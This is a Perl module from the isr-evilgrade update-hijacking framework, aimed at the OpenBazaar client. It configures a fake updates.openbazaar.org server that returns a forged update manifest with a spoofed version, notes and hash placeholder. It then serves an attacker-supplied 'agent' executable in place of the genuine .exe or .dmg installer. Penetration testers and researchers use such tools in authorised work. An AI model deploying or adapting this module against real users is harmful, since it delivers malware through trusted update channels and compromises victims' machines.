###############
# openbazaar.pm
#
# Copyright 2016 Matias Ariel Re Medina
#
# Info:
# Credits to Simon 'evilsocket' Margaritelli for the discovery.
# https://github.com/OpenBazaar/OpenBazaar-Client/issues/1633
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.
#
# isr-evilgrade is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with isr-evilgrade; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#
# '''
##
package modules::openbazaar;

use strict;
use Data::Dump qw(dump);

my $base = {
    'name'        => 'openbazaar',
    'version'     => '1.0',
    'appver'      => 'All',
    'author'      => ['Matias Ariel Re Medina <mre[at]faradaysec[dot]com>'],
    'description' => qq{OpenBazaar update.'},
    'vh'          => '(updates.openbazaar.org)',
    'request'     => [
        {   'req'    => 'update\/\w+\/',    #regex friendly
            'type'   => 'string',                  #file|string|agent|install
            'method' => '',                        #any
            'bin'    => '0',
            'string' =>'{"url": "http://updates.openbazaar.org/download/v<%VERSION%>/<%FILENAME%>","name": "<%VERSION%>","notes": "Lastest update available.\r\n\r\n\r\n## Hashes\r\n\r\n**<%FILENAME%>**\r\n<%AGENTSHA256%>\n","pub_date": "<%PUBDATE%>"}',
            'parse' => '1',
            'file'  => '',
        },
        {   'req'    => '.exe|.dmg',                    #regex friendly
            'type'   => 'agent',                   #file|string|agent|install
            'method' => '',                        #any
            'bin'    => 1,
            'string' => '',
            'parse'  => '0',
            'file'   => ''
        },
    ],

    #Options
    'options' => {
        'agent' => {
            'val' => './agent/agent.exe',
            'desc' =>
                'Agent to inject. Remember that OpenBazaar also runs with .dmg files too.'
        },
        'enable' => {
            'val'  => 1,
            'desc' => 'Status'
        },
        'filename' => {
            'val'  => "OpenBazaar-1.1.6_Setup_i386.exe",
            'desc' => 'Client name.'
        },
        'version' => {
            'val'  => '1.1.6',
            'desc' => 'Version name of the client.'
        },
        'pubdate' => {
            'val'  => '2016-06-07T02:13:05.000Z',
            'desc' => 'Publication date of current update.'
        },

    }
};

##########################################################################
# FUNCTION      new
# RECEIVES
# RETURNS
# EXPECTS
# DOES          class's constructor
sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}
1;
